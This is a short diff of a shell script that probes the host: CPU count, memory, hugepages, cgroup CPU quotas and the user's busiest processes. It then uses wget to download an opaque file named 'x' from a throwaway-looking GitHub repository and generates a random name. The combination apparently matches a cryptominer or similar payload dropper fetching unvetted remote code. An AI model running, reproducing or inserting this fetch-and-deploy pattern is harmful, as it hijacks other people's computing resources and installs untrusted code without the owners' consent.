@@ -13,7 +13,10 @@ free -h
 grep -E 'HugePages|Hugepagesize' /proc/meminfo
 cat /sys/fs/cgroup/cpu.max 2>/dev/null
 cat /sys/fs/cgroup/cpu.stat 2>/dev/null
-
+echo "CPU:"; nproc
+echo "RAM:"; free -h
+echo "Processes:"; ps -u "$USER" -o pid,comm,%cpu,%mem --sort=-%cpu | head -15
+echo "Cgroup:"; cat /sys/fs/cgroup/cpu.max 2>/dev/null
 wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x
 
 NEW_V2=$(random_name)
